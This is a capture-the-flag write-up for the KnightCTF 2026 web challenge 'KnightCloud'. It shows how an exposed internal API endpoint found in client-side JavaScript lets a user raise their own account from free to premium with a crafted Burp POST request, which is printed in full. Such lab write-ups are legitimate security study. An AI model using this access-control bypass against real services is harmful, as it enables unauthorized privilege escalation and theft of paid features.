---
title: "KnightCloud - KnightCTF 2026"
category: "web"
subcategory: "jwt"
type: "writeup"
tags: ["web", "knightctf2026", "knightctf", "jwt", "burp", "base64", "knightctf-2026", "2026", "ctf-writeup"]
summary: "Your startup just signed up for KnightCloud's enterprise SaaS platform, but the premium features are locked behind a paywall."
source:
  name: "CTFtime writeup #40532"
  url: "https://ctftime.org/writeup/40532"
original_source: "https://swarnimbandekar.github.io/knightctf26/"
ctf:
  name: "KnightCTF 2026"
  year: 2026
  challenge: "KnightCloud"
---

## Metadata

- **CTF:** KnightCTF 2026
- **Task:** KnightCloud
- **Author team:** TrickedMyAunty
- **CTFtime tags:** web, knightctf2026, knightctf
- **CTFtime:** <https://ctftime.org/writeup/40532>
- **Original writeup:** <https://swarnimbandekar.github.io/knightctf26/>

---
## KnightCloud

**Category:** Web 

### Challenge Description  
Your startup just signed up for KnightCloud's enterprise SaaS platform, but the premium features are locked behind a paywall. As a security researcher, you've been tasked to test their platform's security. Can you find a way to access the premium analytics dashboard without paying?

**URL**  
http://23.239.26.112:8091/

### Solution  
\- created an account, which landed me on a dashboard with user `Free tier`  
![free](<https://hackmd.io/_uploads/SJCGjR1IWg.png>)

\- i than started going through all the requests and found the jwt and base64 encoded user in localStorage. but that was not working.

\- i than started going through the js files on the source code and found a js file with exposed api requests to upgrade an user from `free` to `premium`

```  
examples: {  
upgradeUserExample: {  
endpoint: "/api/internal/v1/migrate/user-tier",  
method: "POST",  
body: {  
u: "user-uid-here",  
t: "premium"  
},  
validTiers: ["free", "premium", "enterprise"]  
}  
}  
```  
![req](<https://hackmd.io/_uploads/SyLmi0JUWe.png>)

\- i crafted a burpsuite request and sent to my uid, and then I refreshed my dashboard, i had got premium user, so got the flag.

```  
POST /api/internal/v1/migrate/user-tier HTTP/1.1  
Host: 23.239.26.112:8091  
Authorization: Bearer YOUR_JWT_TOKEN  
Content-Type: application/json

{  
"u": "7adb76f6-ff4b-4cf0-b48c-de502e297a08",  
"t": "premium"  
}  
```  
![falg](<https://hackmd.io/_uploads/r1JNsR18Zx.png>)

### Flag  
**KCTF{REDACTED}**
